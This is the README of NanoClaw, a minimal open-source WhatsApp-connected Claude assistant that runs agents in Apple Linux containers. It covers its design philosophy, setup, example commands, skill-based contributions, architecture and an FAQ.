    &lt;p&gt;OpenClaw is an impressive project with a great vision. But I can't sleep well running software I don't understand with access to my life. OpenClaw has 52+ modules, 8 config management files, 45+ dependencies, and abstractions for 15 channel providers. Security is application-level (allowlists, pairing codes) rather than OS isolation. Everything runs in one Node process with shared memory.&lt;/p&gt;
    &lt;p&gt;NanoClaw gives you the same core functionality in a codebase you can understand in 8 minutes. One process. A handful of files. Agents run in actual Linux containers with filesystem isolation, not behind permission checks.&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/gavrielc/nanoclaw.git
cd nanoclaw
claude&lt;/code&gt;
    &lt;p&gt;Then run &lt;code&gt;/setup&lt;/code&gt;. Claude Code handles everything: dependencies, authentication, container setup, service configuration.&lt;/p&gt;
    &lt;p&gt;Small enough to understand. One process, a few source files. No microservices, no message queues, no abstraction layers. Have Claude Code walk you through it.&lt;/p&gt;
    &lt;p&gt;Secure by isolation. Agents run in Linux containers (Apple Container). They can only see what's explicitly mounted. Bash access is safe because commands run inside the container, not on your Mac.&lt;/p&gt;
    &lt;p&gt;Built for one user. This isn't a framework. It's working software that fits my exact needs. You fork it and have Claude Code make it match your exact needs.&lt;/p&gt;
    &lt;p&gt;Customization = code changes. No configuration sprawl. Want different behavior? Modify the code. The codebase is small enough that this is safe.&lt;/p&gt;
    &lt;p&gt;AI-native. No installation wizard; Claude Code guides setup. No monitoring dashboard; ask Claude what's happening. No debugging tools; describe the problem, Claude fixes it.&lt;/p&gt;
    &lt;p&gt;Skills over features. Contributors shouldn't add features (e.g. support for Telegram) to the codebase. Instead, they contribute skills like &lt;code&gt;/add-telegram&lt;/code&gt; that transform your fork. You end up with clean code that does exactly what you need.&lt;/p&gt;
    &lt;p&gt;Best harness, best model. This runs on Claude Agent SDK, which means you're running Claude Code directly. The harness matters. A bad harness makes even smart models seem dumb, a good harness gives them superpowers. Claude Code is (IMO) the best harness available.&lt;/p&gt;
    &lt;p&gt;No ToS gray areas. Because it uses Claude Agent SDK natively with no hacks or workarounds, using your subscription with your auth token is completely legitimate (I think). No risk of being shut down for terms of service violations (I am not a lawyer).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;WhatsApp I/O - Message Claude from your phone&lt;/item&gt;
      &lt;item&gt;Isolated group context - Each group has its own &lt;code&gt;CLAUDE.md&lt;/code&gt;memory, isolated filesystem, and runs in its own container sandbox with only that filesystem mounted&lt;/item&gt;
      &lt;item&gt;Main channel - Your private channel (self-chat) for admin control; every other group is completely isolated&lt;/item&gt;
      &lt;item&gt;Scheduled tasks - Recurring jobs that run Claude and can message you back&lt;/item&gt;
      &lt;item&gt;Web access - Search and fetch content&lt;/item&gt;
      &lt;item&gt;Container isolation - Agents sandboxed in Apple containers&lt;/item&gt;
      &lt;item&gt;Optional integrations - Add Gmail (&lt;code&gt;/add-gmail&lt;/code&gt;) and more via skills&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Talk to your assistant with the trigger word (default: &lt;code&gt;@Andy&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;@Andy send an overview of the sales pipeline every weekday morning at 9am (has access to my Obsidian vault folder)
@Andy review the git history for the past week each Friday and update the README if there's drift
@Andy every Monday at 8am, compile news on AI developments from Hacker News and TechCrunch and message me a briefing
&lt;/code&gt;
    &lt;p&gt;From the main channel (your self-chat), you can manage groups and tasks:&lt;/p&gt;
    &lt;code&gt;@Andy list all scheduled tasks across groups
@Andy pause the Monday briefing task
@Andy join the Family Chat group
&lt;/code&gt;
    &lt;p&gt;There are no configuration files to learn. Just tell Claude Code what you want:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;"Change the trigger word to @Bob"&lt;/item&gt;
      &lt;item&gt;"Remember in the future to make responses shorter and more direct"&lt;/item&gt;
      &lt;item&gt;"Add a custom greeting when I say good morning"&lt;/item&gt;
      &lt;item&gt;"Store conversation summaries weekly"&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Or run &lt;code&gt;/customize&lt;/code&gt; for guided changes.&lt;/p&gt;
    &lt;p&gt;The codebase is small enough that Claude can safely modify it.&lt;/p&gt;
    &lt;p&gt;Don't add features. Add skills.&lt;/p&gt;
    &lt;p&gt;If you want to add Telegram support, don't create a PR that adds Telegram alongside WhatsApp. Instead, contribute a skill file (&lt;code&gt;.claude/skills/add-telegram/SKILL.md&lt;/code&gt;) that teaches Claude Code how to transform a NanoClaw installation to use Telegram.&lt;/p&gt;
    &lt;p&gt;Users then run &lt;code&gt;/add-telegram&lt;/code&gt; on their fork and get clean code that does exactly what they need, not a bloated system trying to support every use case.&lt;/p&gt;
    &lt;p&gt;Skills we'd love to see:&lt;/p&gt;
    &lt;p&gt;Communication Channels&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/add-telegram&lt;/code&gt;- Add Telegram as channel. Should give the user option to replace WhatsApp or add as additional channel. Also should be possible to add it as a control channel (where it can trigger actions) or just a channel that can be used in actions triggered elsewhere&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;/add-slack&lt;/code&gt;- Add Slack&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;/add-discord&lt;/code&gt;- Add Discord&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Container Runtime&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/convert-to-docker&lt;/code&gt;- Replace Apple Container with Docker (unlocks Linux)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Platform Support&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/setup-windows&lt;/code&gt;- Windows via WSL2 + Docker&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Session Management&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/add-clear&lt;/code&gt;- Add a&lt;code&gt;/clear&lt;/code&gt;command that compacts the conversation (summarizes context while preserving critical information in the same session). Requires figuring out how to trigger compaction programmatically via the Claude Agent SDK.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS Tahoe (26) or later - runs great on Mac Mini&lt;/item&gt;
      &lt;item&gt;Node.js 20+&lt;/item&gt;
      &lt;item&gt;Claude Code&lt;/item&gt;
      &lt;item&gt;Apple Container&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;WhatsApp (baileys) --&amp;gt; SQLite --&amp;gt; Polling loop --&amp;gt; Container (Claude Agent SDK) --&amp;gt; Response
&lt;/code&gt;
    &lt;p&gt;Single Node.js process. Agents execute in isolated Linux containers with mounted directories. IPC via filesystem. No daemons, no queues, no complexity.&lt;/p&gt;
    &lt;p&gt;Key files:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;src/index.ts&lt;/code&gt;- Main app: WhatsApp connection, routing, IPC&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;src/container-runner.ts&lt;/code&gt;- Spawns agent containers&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;src/task-scheduler.ts&lt;/code&gt;- Runs scheduled tasks&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;src/db.ts&lt;/code&gt;- SQLite operations&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;groups/*/CLAUDE.md&lt;/code&gt;- Per-group memory&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why WhatsApp and not Telegram/Signal/etc?&lt;/p&gt;
    &lt;p&gt;Because I use WhatsApp. Fork it and run a skill to change it. That's the whole point.&lt;/p&gt;
    &lt;p&gt;Why Apple Container instead of Docker?&lt;/p&gt;
    &lt;p&gt;Lightweight, fast, and built into macOS. Requires macOS Tahoe and runs great on a Mac Mini. Contribute a skill to convert to Docker if you want Docker.&lt;/p&gt;
    &lt;p&gt;Can I run this on Linux?&lt;/p&gt;
    &lt;p&gt;Yes. Run Claude Code and say "make this run on Linux." ~30 min of back-and-forth and it'll work. When you're done, ask Claude to create a skill explaining how to make it work on Linux, then contribute the skill back to the project.&lt;/p&gt;
    &lt;p&gt;Is this secure?&lt;/p&gt;
    &lt;p&gt;Agents run in containers, not behind application-level permission checks. They can only access explicitly mounted directories. You should still review what you're running, but the codebase is small enough that you actually can. See docs/SECURITY.md for the full security model.&lt;/p&gt;
    &lt;p&gt;Why no configuration files?&lt;/p&gt;
    &lt;p&gt;We don't want configuration sprawl. Every user should customize it to so that the code matches exactly what they want rather than configuring a generic system. If you like having config files, tell Claude to add them.&lt;/p&gt;
    &lt;p&gt;How do I debug issues?&lt;/p&gt;
    &lt;p&gt;Ask Claude Code. "Why isn't the scheduler running?" "What's in the recent logs?" "Why did this message not get a response?" That's the AI-native approach.&lt;/p&gt;
    &lt;p&gt;Why isn't the setup working for me?&lt;/p&gt;
    &lt;p&gt;I don't know. Run &lt;code&gt;claude&lt;/code&gt;, then run &lt;code&gt;/debug&lt;/code&gt;. If claude finds an issue that is likely affecting other users, open a PR to modify the setup SKILL.md.&lt;/p&gt;
    &lt;p&gt;What changes will be accepted into the codebase?&lt;/p&gt;
    &lt;p&gt;Security fixes, bug fixes, and clear improvements to the base configuration. That's it.&lt;/p&gt;
    &lt;p&gt;Everything else (new capabilities, OS compatibility, hardware support, enhancements) should be contributed as skills.&lt;/p&gt;
    &lt;p&gt;This keeps the base system minimal and lets every user customize their installation without inheriting features they don't want.&lt;/p&gt;
    &lt;p&gt;MIT&lt;/p&gt;
  &lt;/main&gt;
